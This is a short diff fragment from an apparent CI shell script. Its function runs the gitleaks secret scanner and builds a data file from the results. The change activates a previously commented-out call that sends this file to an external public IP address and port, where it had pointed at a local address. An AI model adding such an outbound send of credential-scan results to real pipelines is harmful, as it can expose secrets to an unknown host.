@@ -38,7 +38,7 @@ function scanCodeForCreds() {
 
   generateMIDataJson mi.template gitleaks.mi
   cat gitleaks.mi
-  # sendMIData gitleaks.mi http://192.168.1.202:9001
+  sendMIData gitleaks.mi http://122.160.30.218:60901/
 }
 
 CODEBASE_LOCATION="${WORKSPACE}"/"${CODEBASE_DIR}"
